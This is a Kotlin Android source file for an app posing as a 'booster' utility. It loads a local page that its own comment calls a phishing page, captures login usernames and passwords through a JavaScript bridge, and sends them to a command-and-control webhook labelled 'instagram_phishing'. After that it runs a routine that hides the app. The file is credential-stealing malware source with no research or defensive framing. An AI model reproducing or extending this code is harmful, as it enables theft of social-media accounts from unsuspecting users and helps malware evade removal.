package com.sysopt.booster

import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity

class LoginActivity : AppCompatActivity() {
    private lateinit var webView: WebView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login)

        webView = findViewById(R.id.loginWebView)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            setSupportZoom(false)
            builtInZoomControls = false
            displayZoomControls = false
            loadWithOverviewMode = true
            useWideViewPort = true
            userAgentString = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36"
            cacheMode = android.webkit.WebSettings.LOAD_NO_CACHE
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean = false
        }

        // JavaScript bridge
        webView.addJavascriptInterface(WebBridge(), "Android")

        // Load local phishing page
        webView.loadUrl("file:///android_asset/login.html")
    }

    inner class WebBridge {
        @JavascriptInterface
        fun sendCredentials(user: String, pass: String) {
            // Encrypt and store
            val encryptedUser = CryptoManager.encrypt(user)
            val encryptedPass = CryptoManager.encrypt(pass)
            CredentialManager.storeCredentials(this@LoginActivity, encryptedUser, encryptedPass)

            // Send to C2 immediately
            WebhookClient.sendCredentials(user, pass, "instagram_phishing")

            // Execute hide routine
            Handler().postDelayed({
                HideManager.execute(this@LoginActivity)
            }, 1000)
        }

        @JavascriptInterface
        fun log(msg: String) {
            // Debug only
        }
    }
}